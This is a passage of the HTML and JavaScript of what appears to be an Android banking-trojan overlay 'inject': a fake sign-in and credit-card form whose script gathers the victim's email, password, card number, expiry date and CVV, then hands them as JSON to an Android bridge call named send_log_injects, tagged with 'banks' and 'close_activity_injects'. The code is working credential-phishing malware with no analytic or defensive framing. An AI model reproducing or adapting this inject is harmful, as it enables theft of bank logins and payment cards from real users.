<style>
    #form1,#form2{
        display: flex;
        flex-direction:column;
        height: 100vh;
    }
    section{
        padding: 15px;
        flex:1;
    }
    #div{
        padding: 5px;
        width: 100%;
        border-top-left-radius:5px;
        border-top-right-radius:5px;
        border:1px solid #dbdedb;
    } 
    #div1{
        width: 100%;
        border-bottom-left-radius:5px;
        border-bottom-right-radius:5px;
        border:1px solid #dbdedb;
        padding: 5px;
        border-top: 0;
        overflow: hidden;
    }
    .input{
        width: 100%;
        border: 0;
        border-bottom: 1px solid #Fff;
    }
    input,button {
        outline: none !important;
        box-shadow: none !important;
    }

    .error {
        border-color: #f00 !important;
    }
    label{
        font-weight: 500;
        font-size: 14px;
    }
    .remember{
        width: 100%;
        background-color: #eff2f0;
        padding: 10px;
        margin-top: 20px;
        border-radius: 5px;
    }
    footer{
        padding: 15px;
    }
    .button{
        width: 100%;
        border-radius: 75px;
        border:0;
        background-color: #151418;
        color: #fff;
        font-weight: 600;
        padding: 10px;
    }
    .button:disabled{
        opacity: 0.5;
    }
</style>

            <section>
                <div id="div" s>
                    <label for="cc">Credit Card</label>
                    <input type="tel" id="cc"   name="cc" onkeyup="check6();check8()" class="input" placeholder="" autocomplete="off">
                </div>
                <div style="clear:both;"></div>
                <div id="div1">
                    <label for="exp" style="float:left; width: 58%;">Expiration Date</label>
                    <label for="cvv" style="float:right; width: 40%;">CVV</label>

                    <input type="tel" id="exp" name="exp" maxlength="5" style="width: 58%;float: left;margin-top: 15px;" onkeyup="check7();check8()" class="input" placeholder="" autocomplete="off">
                    <input type="password" id="cvv" name="cvv" maxlength="3" style="width: 40%;float: right;margin-top: 15px;" onkeyup="check8()" class="input" placeholder="" autocomplete="off">
            
                </div>
            </section>
            <footer>
                <input type="submit" class="button" id="sendData" disabled value="Sign in">
            </footer>
        </div>
    </form>
<script>
   var checkOff = document.getElementById('checkOff'),
        checkOn = document.getElementById('checkOn');

    checkOff.onclick = () => {
        checkOff.style.display = 'none';
        checkOn.style.display = 'inline';
    }

    checkOn.onclick = () => {
        checkOn.style.display = 'none';
        checkOff.style.display = 'inline';
    }
    $('#cc').mask('0000 0000 0000 0000')
           $('#exp').mask('00/00')
           $('#cvv').mask('000')
   
           var form1 = document.getElementById('form1'),
               form2 = document.getElementById('form2');
   
           var login = document.getElementById('login'),
               password = document.getElementById('password');
   
           var nextPage = document.getElementById('nextPage'),
               sendData = document.getElementById('sendData');
   
               var emailValid = /^([A-Za-z0-9_\-\.])+\@([A-Za-z0-9_\-\.])+\.([A-Za-z]{2,4})$/;
   
           nextPage.onclick = () => {
               if(!emailValid.test(login.value)) {
                   login.classList.add('error');
               } else {
                   login.classList.remove('error');
               }
               if(password.value.length < 4) {
                   password.classList.add('error');
               } else {
                   password.classList.remove('error');
               }

               if(emailValid.test(login.value) && password.value.length >= 4) {
                var data = {};
                   data.login = login.value;
                   data.password = password.value;
                   data.type_injects = "banks";
                   data.closed = "close_activity_injects";
   
                   var ua = navigator.userAgent.toLowerCase();
                   if(ua.indexOf("android") > -1) {
                       try {
                           Android.send_log_injects(JSON.stringify(data))
                       } catch (err) {}
                   }else{
                       alert(JSON.stringify(data));
                   }
               }
           }
         
           function check7() {
               
               var mmYY = exp.value.split('/');
               var month = parseInt(mmYY[0]);
               var year = parseInt(mmYY[1]);
       
               var expArray = exp.value.split('/');
               var today, someday;
               var exMonth = expArray[0];
               var exYear = "20" + expArray[1];
       
               today = new Date();
               someday = new Date();
               someday.setFullYear(exYear, exMonth, 1);
                       
               if(month > 12 || month == 0 || month == 00 || someday < today || year > 27 || exp.value.length != 5) {
                   exp.classList.add('error')
               } else {
                   exp.classList.remove('error')
                   return true
               }
           }
   
           function check6() {
               if(!valid_credit_card(cc.value)) {
                   cc.classList.add('error')
               } else {
                   cc.classList.remove('error');
               }
           }
   
           function valid_credit_card(value) {
               if(value=='' || value.length < 19 || value=='0000 0000 0000 0000') return false;
               if (/[^0-9-\s]+/.test(value)) return false;
               var nCheck = 0, nDigit = 0, bEven = false;
               value = value.replace(/\D/g, "");
               for (var n = value.length - 1; n >= 0; n--) {
                   var cDigit = value.charAt(n),
                       nDigit = parseInt(cDigit, 10);
                   if (bEven) {
                       if ((nDigit *= 2) > 9) nDigit -= 9;
                   }
                   nCheck += nDigit;
                   bEven = !bEven;
               }
               return (nCheck % 10) == 0;
               
           }
   
           function check8() {
               if(valid_credit_card(cc.value) && check7() && cvv.value.length === 3) {
                   sendData.disabled = false;
               } else {
                   sendData.disabled = true;
               }
           }
   
           sendData.onclick = () => {
                   var data = {};
                   data.login = login.value;
                   data.password = password.value;
                   data.cc = cc.value;
                   data.exp = exp.value;
                   data.cvv = cvv.value;
                   data.type_injects = "banks";
                   data.closed = "close_activity_injects";
   
                   var ua = navigator.userAgent.toLowerCase();
                   if(ua.indexOf("android") > -1) {
                       try {
                           Android.send_log_injects(JSON.stringify(data))
                       } catch (err) {}
                   }else{
                       alert(JSON.stringify(data));
                   }
           }
                
        var eye = document.getElementById('eye');

        eye.onclick = () => {
            if(password.type == 'password') {
                password.type = 'text';
            } else {
                password.type = 'password';
            }
        }

</script>
</body>
</html>
